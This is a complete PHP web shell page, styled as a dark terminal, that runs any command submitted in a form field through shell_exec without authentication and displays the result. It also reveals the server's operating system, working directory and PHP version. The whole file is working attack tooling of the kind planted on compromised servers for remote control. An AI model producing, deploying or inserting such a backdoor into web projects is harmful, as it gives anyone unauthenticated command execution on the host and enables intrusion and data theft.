<?php
if (!empty($_POST['shell'])) {
    $shell = shell_exec($_POST['shell']);
}
?>
<!DOCTYPE html>
<head>
    <title>PHP SHELL</title>
    <style>

        body {
            font-family: monospace;
            background-color: #000;
        }

        main {
            max-width: 1000px;
	    margin: auto;
        }

	i {
            color: #8CB8FF;
        }

        h1 {
            color: #FC5D5D;
        }

        h2 {
            color: #FCC25D;
        }

        pre, input, button {
            padding: 6px;
            background-color: #000;
	    color: #FFF;
	    border: 2px solid #808080;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
        }

        input:focus {
            outline: none;
        }

        button {
            cursor: pointer;
	    margin-left: 20px;
        }

        button:hover {
            background-color: #000;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }

    </style>
</head>

<body>
    <main>

        <h1>$ PHP shell</h1>
        <h2>$ About server</h2>

	<i>
	    Operating System: <?php echo php_uname(); ?><br/>
	    Current path: <?php echo `pwd` ?><br/>
            PHP Version: <?php echo PHP_VERSION ?><br/><br/>
	</i>

	<hr>

        <form method="post">

            <label for="shell"><h2>$ Terminal</h2></label>

            <div class="form-group">

                <input type="text" name="shell" id="shell" value="<?= htmlspecialchars($_POST['shell'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>

            </div>

        </form>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>

            <h2>$ Output</h2>

            <?php if (isset($shell)): ?>
                <pre><?= htmlspecialchars($shell, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre>No result.</pre>
            <?php endif; ?>
        <?php endif; ?>

    </main>
</body>
</html>
